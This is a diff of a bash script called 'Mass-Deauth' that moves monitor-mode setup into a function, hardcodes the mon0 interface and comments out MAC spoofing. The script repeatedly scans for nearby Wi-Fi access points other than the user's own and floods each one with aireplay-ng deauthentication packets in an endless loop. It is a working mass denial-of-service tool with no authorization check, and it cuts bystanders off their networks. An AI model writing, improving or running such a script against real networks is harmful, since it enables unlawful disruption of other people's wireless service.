@@ -1,8 +1,9 @@
 #!/bin/bash
 # Mass-Deauth Script by RFKiller <http://rfkiller.they.org>
-# Send all emails to <grant.c.stone@gmail.com>
-# Copyright (c) GPLv3 - 2013 RFKiller
-# Please see the LICENSE file that came with this script
+# Send all complaints and improvements on GitHub <https://github.com/RFKiller/mass-deauth>
+# Licensed as GPLv3 on 2013 by RFKiller
+# Please see the README file that came with this script
+# Version 1.0 BETA (June 14, 2016)
 
 if [[ $EUID -ne 0 ]]; then
 	echo -e "\033[31m\n[!] This script MUST be run as root. Aborting...\033[0m\n" 1>&2
@@ -32,19 +33,6 @@ function usage() {
 
 EOF
 }
-function rmlogs() {
-	if [ -e "/tmp/scan.tmp" ]; then rm /tmp/scan.tmp ; fi
-	#if [ -e "/tmp/APmacs.lst" ]; then rm /tmp/APmacs.lst ; fi
-	if [ -e "/tmp/APchannels.lst" ]; then rm /tmp/APchannels.lst ; fi
-}
-function cleanup() {
-	echo -e "\n\n\033[31m[!] Killing aireplay-ng and $MIFACE...\033[0m"
-	killall -9 aireplay-ng &> /dev/null
-	iw dev $MIFACE del &> /dev/null
-	echo -e "\033[31m[!] Removing logs and scan data...\033[0m\n"
-	sleep 1; rmlogs
-	exit 0
-}
 
 flags=':d:hi:m:w:'
 while getopts $flags option; do
@@ -61,9 +49,27 @@ while getopts $flags option; do
 done
 shift $(($OPTIND - 1))
 
-version="0.3"
+function set_mon0 {
+    MIFACE=$(ip link set $WIFACE up && iw dev | awk '$0 ~ /Interface / {print $WIFACE}' | iw dev $WIFACE interface add mon0 type monitor &> /dev/null)
+    ip link set $WIFACE up &> /dev/null
+    ip link set $MIFACE up &> /dev/null
+}
+function rmlogs() {
+	if [ -e "/tmp/scan.tmp" ]; then rm /tmp/scan.tmp ; fi
+	#if [ -e "/tmp/APmacs.lst" ]; then rm /tmp/APmacs.lst ; fi
+	if [ -e "/tmp/APchannels.lst" ]; then rm /tmp/APchannels.lst ; fi
+}
+function cleanup() {
+	echo -e "\n\n\033[31m[!] Killing aireplay-ng and mon0...\033[0m"
+	killall -9 aireplay-ng &> /dev/null
+	iw dev mon0 del &> /dev/null
+	echo -e "\033[31m[!] Removing logs and scan data...\033[0m\n"
+	sleep 1; rmlogs
+	exit 0
+}
+
 atk="0"
-MIFACE=$(iw dev | awk '$0 ~ /Interface / {print $2}' | grep mon)
+#MIFACE=$(iw dev | awk '$0 ~ /Interface / {print $2}' | grep mon0)
 ask_to_install="1" # Change to 0 or comment out this line to skip asking for installation
 suggestedAPmac=$(arp -a | grep -E -o '[[:xdigit:]]{2}(:[[:xdigit:]]{2}){5}')
 
@@ -97,6 +103,7 @@ while [[ ! $WIFACE ]]; do
 	read -e WIFACE
 	sleep 0.5; echo
 done
+set_mon0
 while [[ ! $DEAUTHS ]]; do
 	echo -e "\033[33m[-] How many deauthentication packets would you to send to each router?\n[-] Hit [ENTER] to use the default (15)\033[0m"
 	read -e DEAUTHS
@@ -131,21 +138,18 @@ done
 export ourAPmac
 
 trap cleanup INT
-#ip link set $WIFACE up &> /dev/null
 rmlogs
+ip link set $WIFACE up &> /dev/null
+ip link set mon0 up &> /dev/null
 
-while [[ ! $moncheck ]]; do
-	moncheck=`iw dev | awk '$0 ~ /Interface / {print $2}' | grep mon`
-	ip link set $WIFACE up && iw dev $WIFACE interface add mon0 type monitor &> /dev/null
-done
-
-echo -e "\033[33m[-] Changing wireless card MAC address...\033[0m"; sleep 3
-ip link set $MIFACE down && macchanger -A $MIFACE && ip link set $MIFACE up && echo -e "\033[32m[+] $MIFACE interface MAC address successfully changed!"
-sleep 1; echo
+#echo -e "\033[33m[-] Changing wireless card MAC address...\033[0m"; sleep 3
+#ip link set $MIFACE down && macchanger -A $MIFACE && ip link set $MIFACE up && echo -e "\033[32m[+] $MIFACE interface MAC address successfully changed!"
+#sleep 1; echo
 
 scan1="0"
 while true; do
 	rmlogs
+    ifconfig mon0 up &> /dev/null; sleep 0.5
 	iwlist $WIFACE scan > /tmp/scan.tmp
 	#awk --posix '$5 ~ /[0-9a-zA-F]{2}:/ && $5 !~ /'$ourAPmac'/ {print $5}' /tmp/scan.tmp > /tmp/APmacs.lst
 	cat /tmp/scan.tmp | grep "Address:" | grep -v "$ourAPmac" | cut -b 30-60 > /tmp/APmacs.lst
@@ -157,7 +161,7 @@ while true; do
 			curCHAN=`cat /tmp/APchannels.lst | head -n $b`
 			curAP=`sed -n -e ''$b'p' '/tmp/APmacs.lst'`
 			echo -e "\033[32m[+] Deauthenticating all clients on $curAP...\033[0m"
-			aireplay-ng -0 $DEAUTHS -D -a $curAP $MIFACE &> /dev/null &
+			aireplay-ng -0 $DEAUTHS -D -a $curAP mon0 &> /dev/null &
 	done
 	atk="1"
 	echo -e "\033[33m[-] Sleeping for $waitTime seconds...\n\n[-] Press [ CTRL+C ]  in this window to kill attack...\033[0m\n" && sleep $waitTime
